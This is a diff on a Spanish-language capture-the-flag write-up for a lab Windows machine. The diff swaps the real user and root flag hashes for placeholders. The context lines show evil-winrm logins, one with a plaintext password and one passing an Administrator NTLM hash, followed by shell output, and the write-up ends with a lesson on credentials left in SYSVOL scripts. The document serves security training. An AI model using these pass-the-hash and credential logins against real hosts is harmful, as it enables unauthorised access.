@@ -210,7 +210,7 @@ evil-winrm -i 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341'
 Evil-WinRM shell v3.9
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cat user.txt
-14bce88db0bbfc5019665f49f13d8fbd
+[user flag]
 ```
 📸 *Captura: shell como `N.Thompson` con lectura de `user.txt`.*
 ---
@@ -358,15 +358,15 @@ evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
 Evil-WinRM shell v3.9
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-4824d11906dc30ea675bfb15066d2986
+[root flag]
 ```
 📸 *Captura: shell como `Administrator` con lectura de `root.txt`.*
 ---
 ## 🏁 Flags
 | Flag | Hash |
 |------|------|
-| user.txt | `14bce88db0bbfc5019665f49f13d8fbd` |
-| root.txt | `4824d11906dc30ea675bfb15066d2986` |
+| user.txt | `[user flag]` |
+| root.txt | `[root flag]` |
 ---
 ## 🎓 Lecciones Aprendidas
 - **Nunca almacenar credenciales en scripts de SYSVOL.** Los logon scripts accesibles anónimamente son una fuente crítica de credential exposure. Usar LAPS o mecanismos seguros de distribución de credenciales.
